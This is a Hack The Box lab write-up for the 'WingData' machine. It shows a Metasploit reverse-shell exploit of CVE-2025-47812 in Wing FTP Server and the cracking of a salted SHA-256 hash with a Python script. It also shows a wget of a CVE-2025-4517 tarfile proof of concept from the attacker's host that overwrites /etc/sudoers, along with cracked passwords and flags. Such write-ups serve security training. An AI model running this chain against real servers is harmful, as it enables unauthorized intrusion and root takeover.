# WingData: Hack The Box Writeup

**Machine:** WingData  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** March 2026  

---

## Summary

WingData is an easy Linux machine centred on a publicly exposed Wing FTP Server instance. The attack chain begins with CVE-2025-47812, a NULL-byte authentication bypass in Wing FTP Server 7.4.3 that grants unauthenticated remote code execution via Metasploit. Post-exploitation enumeration of the Wing FTP configuration files reveals FTP user accounts with salted SHA-256 password hashes; cracking the target user's hash with a custom Python script yields SSH credentials. Privilege escalation to root exploits CVE-2025-4517, a PATH_MAX overflow bug in Python's `tarfile` module that bypasses the `filter="data"` extraction sandbox, allowing an arbitrary write to `/etc/sudoers` via a `sudo`-permitted extraction script.

**Key techniques:** CVE-2025-47812 (Wing FTP NULL-byte auth bypass) · Metasploit · Wing FTP config enumeration · Salted SHA-256 hash cracking · Custom Python cracking script · CVE-2025-4517 (Python tarfile PATH_MAX bypass) · Arbitrary file write via sudoers

---

## 1. Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T4 10.129.24.96
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    Apache httpd 2.4.66: redirects to http://wingdata.htb/
```

Two services open: SSH and a web server redirecting to `wingdata.htb`. Adding the domain to `/etc/hosts`:

```bash
sudo vi /etc/hosts
# Add: 10.129.24.96  wingdata.htb
```

---

## 2. Enumeration

### Web Application

Navigating to `http://wingdata.htb` reveals a mostly static page. Only one element is functional: a "Client Portal" link pointing to:

```
http://ftp.wingdata.htb/login.html
```

The page footer identifies the software: **Wing FTP Server v7.4.3**. Adding the new vhost:

```bash
sudo vi /etc/hosts
# Update: 10.129.24.96  wingdata.htb ftp.wingdata.htb
```

Default credentials (`admin:admin`) do not work. Running directory enumeration on the main domain returns nothing interesting beyond standard assets:

```bash
gobuster dir -u http://wingdata.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```
/assets    (Status: 301)
/index.html (Status: 200)
/vendor    (Status: 301)
```

### CVE Research

Searching for "Wing FTP Server 7.4.3 exploit" surfaces **CVE-2025-47812**: an unauthenticated remote code execution vulnerability in Wing FTP Server versions up to and including 7.4.4, caused by a NULL-byte authentication bypass in the web client interface. A Metasploit module is available.

---

## 3. Initial Access: CVE-2025-47812 (Wing FTP NULL-byte Auth Bypass)

```bash
msfconsole -q
msf > search 2025-47812
msf > use exploit/multi/http/wingftp_null_byte_rce
```

Setting options:

```
msf exploit(multi/http/wingftp_null_byte_rce) > set lhost tun0
msf exploit(multi/http/wingftp_null_byte_rce) > set rhosts 10.129.24.96
msf exploit(multi/http/wingftp_null_byte_rce) > set vhost ftp.wingdata.htb
msf exploit(multi/http/wingftp_null_byte_rce) > run
```

```
[+] The target is vulnerable. Detected version 7.4.3 ≤ 7.4.4
[+] Received UID: UID=55a913...; injection succeeded
[*] Meterpreter session 1 opened
```

> **Note:** The VHOST option is critical here. Without it, the module's check fails because it fingerprints against the virtual host's response headers, not the bare IP.

```bash
meterpreter > shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
wingftp@wingdata:/opt/wftpserver$
```

Shell obtained as `wingftp`. The user flag is not in this account's home directory: a second user `wacky` owns it.

---

## 4. Lateral Movement: Wing FTP Config Enumeration & Hash Cracking

### Enumerating Wing FTP Data Directory

Wing FTP stores all configuration in `/opt/wftpserver/Data/`. Exploring the structure:

```bash
ls /opt/wftpserver/Data/1/users/
```

```
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

Each user has an XML config file containing their password hash:

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml | grep -i password
```

```xml
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

### Identifying the Hash Format

The Wing FTP changelog (readable at `/opt/wftpserver/version.txt`) confirms the hashing scheme:

```
Improvement - The admin password specified in installation wizard will be hashed by salted SHA-256.
Added a feature - Added password salting in the domain settings, it is used to protect the user password.
```

The salt is stored in the domain settings file:

```bash
grep -i "salt" /opt/wftpserver/Data/1/settings.xml
```

```xml
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

So the hash is `SHA256(password + "WingFTP")`.

### Cracking with Hashcat or a Custom Python Script

Standard tools struggle with this custom salted format in a VM environment. A Python script handles it directly:

```python
import hashlib, sys

salt = 'WingFTP'
target = '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca'

with open('/usr/share/wordlists/rockyou.txt', 'rb') as f:
    for line in f:
        word = line.strip().decode('latin-1')
        h = hashlib.sha256((word + salt).encode()).hexdigest()
        if h == target:
            print(f'Found: {word}')
            sys.exit(0)
```

```
Found: !#7Blushing^*Bride5
```

### SSH Access

```bash
ssh wacky@10.129.24.96
# Password: !#7Blushing^*Bride5
```

```bash
cat ~/user.txt
# 597f7b8cdf270715e060a5f99773354a
```

---

## 5. Privilege Escalation: CVE-2025-4517 (Python tarfile PATH_MAX Bypass)

### Sudo Enumeration

```bash
sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script extracts tar archives as root using Python's `tarfile.extractall(filter="data")`:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

The `filter="data"` parameter is intended to prevent path traversal by blocking symlinks that resolve outside the extraction directory. However, it is vulnerable to **CVE-2025-4517**.

### Understanding CVE-2025-4517

The filter uses `os.path.realpath(strict=False)` to validate that symlink targets resolve inside the staging directory. When the constructed path exceeds PATH_MAX (4096 bytes on Linux), `os.path.realpath()` silently stops resolving symlinks and falls back to string manipulation. The security check sees a path it believes is safe; the kernel resolves it correctly to a location outside the sandbox.

The exploit builds a tar archive containing:
- 16 levels of directories with ~247-character names (to push paths towards PATH_MAX)
- A symlink chain that traverses up to `/etc/`
- A hardlink through the escaped path targeting `/etc/sudoers`
- A payload file that grants `wacky ALL=(ALL) NOPASSWD: ALL`

### Exploitation

Downloading the PoC to the target:

```bash
# On attack machine
python3 -m http.server 8000

# On target
wget http://10.10.15.12:8000/CVE-2025-4517-POC.py
python3 CVE-2025-4517-POC.py
```

```
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[+] Exploit deployed successfully
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL
```

```bash
[?] Spawn root shell now? (y/n): y
[*] Spawning root shell...
```

```
root@wingdata:/home/wacky# cat /root/root.txt
# ba9287a626624651831f5407570c630e
```

---

<img width="1200" height="681" alt="Screenshot 2026-04-28 103950" src="https://github.com/user-attachments/assets/4caf179b-c444-43ed-9931-8fdf3cfef3be" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---|---|---|
| CVE-2025-47812: Wing FTP NULL-byte auth bypass | `ftp.wingdata.htb` web client | Unauthenticated RCE as `wingftp` |
| Plaintext salt in config file | `/opt/wftpserver/Data/1/settings.xml` | Enables offline hash cracking |
| Salted SHA-256 user hash (weak password) | `/opt/wftpserver/Data/1/users/wacky.xml` | Credential recovery via dictionary attack |
| Credential reuse | Wing FTP password → SSH | Lateral movement to `wacky` |
| CVE-2025-4517: Python tarfile PATH_MAX bypass | `restore_backup_clients.py` (sudo) | Arbitrary file write as root → sudoers escalation |

---

## Key Takeaways

- **Always set VHOST in Metasploit**: the `wingftp_null_byte_rce` module fingerprints against virtual host responses, not the bare IP. Without `set VHOST ftp.wingdata.htb` the check fails and the exploit aborts
- **Wing FTP stores everything in XML**: user credentials, salt configuration, and admin hashes are all readable files on disk once you have a shell as the service account
- **Custom hash schemes need custom tools**: when standard hashcat/john formats don't fit, a short Python script against rockyou is faster and more reliable than fighting tool configuration
- **`filter="data"` is not a security boundary**: CVE-2025-4517 demonstrates that Python's tarfile extraction filter can be bypassed entirely on affected versions; any script running `extractall(filter="data")` as a privileged user is a privesc waiting to happen
- **Check the version.txt / changelog**: Wing FTP ships a detailed `version.txt` in the install directory that documents exactly how passwords are hashed, saving significant reverse engineering time

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
